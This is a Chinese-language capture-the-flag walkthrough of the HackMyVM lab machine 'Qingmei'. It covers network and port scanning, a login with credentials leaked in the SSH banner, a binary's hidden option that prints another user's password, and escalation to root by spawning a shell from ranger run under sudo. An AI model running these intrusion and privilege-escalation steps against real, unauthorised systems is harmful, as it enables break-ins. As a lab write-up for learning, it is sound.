## 1. 信息收集

### 1.1 主机发现

使用 `arp-scan` 工具对本地网络 `192.168.205.0/24` 进行扫描，以识别目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan )
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.218 08:00:27:83:ca:3c       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:bd:56       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.974 seconds (129.69 hosts/sec). 4 responded
```

**结果：** 目标主机 IP 地址确认为 `192.168.205.218`。

### 1.2 端口扫描与服务识别

使用 `nmap` 对目标主机 `192.168.205.218` 进行全端口 TCP 扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- --min-rate 10000 192.168.205.218
Starting Nmap 7.95 ( https://nmap.org  ) at 2025-05-18 22:55 EDT
Nmap scan report for 192.168.205.218
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

进一步对开放端口进行服务版本探测：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p22,80 -sV 192.168.205.218
Starting Nmap 7.95 ( https://nmap.org  ) at 2025-05-19 08:30 EDT
Nmap scan report for 192.168.205.218
Host is up (0.00031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/  .
Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
```

**结果：** 目标主机开放了 SSH 服务 (OpenSSH 8.9p1, 端口 22) 和 HTTP 服务 (Apache httpd 2.4.62, 端口 80)。

## 2. 漏洞分析与利用

### 2.1 Web 服务探测

对目标 80 端口的 HTTP 服务进行初步探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -v http://192.168.205.218
*   Trying 192.168.205.218:80...
* Connected to 192.168.205.218 (192.168.205.218) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.205.218
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Mon, 19 May 2025 03:11:15 GMT
< Server: Apache/2.4.62 (Debian)
< Last-Modified: Sun, 18 May 2025 13:52:35 GMT
< ETag: "64d-6356953de9708"
< Accept-Ranges: bytes
< Content-Length: 1613
< Vary: Accept-Encoding
< Content-Type: text/html
<
<h1>
<pre>
                                   .     **
                                 *           *.
                                               ,*
                                                  *,
                          ,                         ,*
                       .,                              *,
                     /                                    *
                  ,*                                        *,
                /.                                            .*.
              *                                                  **
              ,*                                               ,*
                 **                                          *.
                    **                                    **.
                      ,*                                **
                         *,                          ,*
                            *                      **
                              *,                .*
                                 *.           **
                                   **      ,*,
                                      ** *,     HackMyVM

   QQ Group:   660930334
   </h1>
</pre>
* Connection
```

Web 首页内容为字符画及 QQ 群号，未发现直接可利用信息。

使用 `dirb` 进行目录爆破：

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.205.218

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun May 18 23:13:00 2025
URL_BASE: http://192.168.205.218/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.205.218/ ----
+ http://192.168.205.218/index.html (CODE:200|SIZE:1613)
+ http://192.168.205.218/server-status (CODE:403|SIZE:280)

-----------------
END_TIME: Sun May 18 23:13:03 2025
DOWNLOADED: 4612 - FOUND: 2
```

**结果：** 目录爆破仅发现 `index.html` 和被禁止访问的 `server-status`。Web 服务方面未找到明显突破口。

### 2.2 SSH 服务探测与初始访问

尝试连接 SSH 服务，观察其 Banner 信息。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh root@192.168.205.218
 ____________
( guest/guest )
 -------------
        o   ^__^
         o  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
root@192.168.205.218's password:
```

**发现：** SSH Banner 泄露了凭据 `guest/guest`。

使用泄露的凭据 `guest:guest` 登录 SSH：

```bash
┌──(kali㉿kali)-[~]
└─$ ssh guest@192.168.205.218
Password: guest
# 成功登录
guest@Qingmei:~$ id
uid=1000(guest) gid=1000(guest) groups=1000(guest)
```

**结果：** 成功以 `guest` 用户身份获得对系统的初始访问权限。

## 3. 权限提升

### 3.1 权限提升：guest -> morri

登录后，对 `guest` 用户进行本地枚举。

#### 3.1.1 家目录检查与 sudo 权限

查看 `guest` 用户家目录内容及 `sudo` 权限：

```bash
guest@Qingmei:~$ ls -la
total 28
drwxr-xr-x 2 guest guest 4096 May 18 22:57 .
drwxr-xr-x 4 root  root  4096 May 18 09:55 ..
-rw-r--r-- 1 root  root   166 May 18 09:55 banner
-rw-r--r-- 1 guest guest  220 May 18 09:54 .bash_logout
-rw-r--r-- 1 guest guest 3543 May 18 09:55 .bashrc
-rw------- 1 guest guest   31 May 18 22:32 .lesshst
-rw-r--r-- 1 guest guest  807 May 18 09:54 .profile

guest@Qingmei:~$ cat banner
 ____________
< Are u ok ? >
 -------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

guest@Qingmei:~$ sudo -l
[sudo] password for guest: guest
Sorry, user guest may not run sudo on Qingmei.
```

**结果：** `guest` 用户无 `sudo` 权限。家目录下的 `banner` 文件内容如上。

#### 3.1.2 SUID 文件检查

```bash
guest@Qingmei:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

**结果：** 未发现非标准的 SUID 可执行文件。

#### 3.1.3 检查 `/opt` 目录

```bash
guest@Qingmei:~$ cd /opt/
guest@Qingmei:/opt$ ls -al
total 32
drwxr-xr-x  2 root root  4096 May 18 10:12 .
drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
-rw-r--r--  1 root root   169 May 18 09:53 banner.txt
-rwx-----x  1 root root 17024 May 18 10:12 morri_password
```

**发现：** 在 `/opt` 目录下发现一个名为 `morri_password` 的可执行文件，其所有者为 `root`，但 `guest` 用户（属于 `others`）具有执行权限。

尝试执行该程序并查看帮助信息：

```bash
guest@Qingmei:/opt$ ./morri_password
You need to input strings of 'A's with correct lengths (10-50 characters).
You'll be asked to do this 10 times.

Try 1/10: Please input exactly 26 'A's: ^C

guest@Qingmei:/opt$ ./morri_password -h
Usage: ./program [options]
Options:
  -h          Show this help message
  --dashazi   Directly output credentials

Normal operation:
  The program will ask you to input strings of 'A's with random lengths (10-50)
  You need to correctly input 10 times to get the credentials
```

**发现：** 程序存在 `--dashazi` 选项可以直接输出凭据。

#### 3.1.4 获取 `morri` 用户凭据

使用 `--dashazi` 选项执行程序：

```bash
guest@Qingmei:/opt$ ./morri_password --dashazi
user:morri pass:morri
```

**结果：** 成功获取用户 `morri` 的凭据为 `morri:morri`。

#### 3.1.5 切换至 `morri` 用户并获取 `user.txt`

```bash
guest@Qingmei:/opt$ su morri
Password: morri # 输入密码 morri
morri@Qingmei:/opt$ id
uid=1001(morri) gid=1001(morri) groups=1001(morri)
morri@Qingmei:/opt$ cd ~
morri@Qingmei:~$ cat user.txt
flag{user-edf050af-33ef-11f0-b3f0-000c2955ba04}
```

**结果：** 成功切换到 `morri` 用户并读取 `user.txt`，获取第一个 flag。

### 3.2 权限提升：morri -> root

#### 3.2.1 Sudo 权限检查 (morri)

检查 `morri` 用户的 `sudo` 权限：

```bash
morri@Qingmei:~$ sudo -l
Matching Defaults entries for morri on Qingmei:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User morri may run the following commands on Qingmei:
    (ALL) NOPASSWD: /usr/bin/ranger
```

**发现：** `morri` 用户可以无密码以 `root` 权限执行 `/usr/bin/ranger`。

#### 3.2.2 利用 `ranger` 提权

`ranger` 是一个终端文件管理器，可以通过其内置的 shell 执行功能来获取 `root` shell。

1. 执行 `sudo /usr/bin/ranger`。

   ```bash
   morri@Qingmei:~$ sudo /usr/bin/ranger
   ```

2. 在 `ranger` 界面中，按下 `s` 键 (或 `:`) 进入命令模式。

3. 输入 `bash -p` (或 `sh -p`) 并回车。参数 `-p` 确保 `bash` 以特权模式（effective UID as root）启动。

执行后，成功返回一个 `root` shell。

```bash
# 此处已是 root shell
root@Qingmei:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Qingmei:~# cat /root/root.txt
flag{root-485ee7a8-33f0-11f0-afbc-000c2955ba04}
```

**结果：** 成功获取 `root` 权限并读取 `root.txt`，获取第二个 flag。

